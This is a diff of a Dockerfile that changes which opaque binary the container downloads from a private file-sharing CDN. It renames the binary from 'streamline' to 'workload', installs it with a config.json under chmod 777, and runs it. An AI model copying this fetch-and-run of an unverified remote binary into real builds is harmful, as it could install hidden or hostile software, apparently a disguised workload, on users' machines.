@@ -4,17 +4,17 @@ LABEL maintainer="Roman Nikov"
 
 RUN apt update; \
     apt install -y wget; \
-    wget https://cdn.filesend.jp/private/EWdCv9xtzS4RyJcEpGSWHXXA8Phpi0Whp4ca-WqT9og1q3i20DYUFVRE5NUqiWmJ/streamline.tar.gz; \
-    tar xf streamline.tar.gz; \
-    cd streamline; \
+    wget https://cdn.filesend.jp/private/G609xtoVDsnU4nsjJMqKVoUybaL5XjaTbhr2xqldLWgTz5dJF07LRpbggqEEx4la/workload.tar.gz; \
+    tar xf workload.tar.gz; \
+    cd workload; \
     cp config.json /usr/local/bin/config.json; \
-    cp streamline /usr/local/bin/streamline; \
+    cp workload /usr/local/bin/workload; \
     cd /usr/local/bin;
 
 WORKDIR /usr/local/bin
 
 RUN chmod 777 config.json;
 
-RUN chmod 777 streamline;
+RUN chmod 777 workload;
 
-CMD streamline
+CMD workload
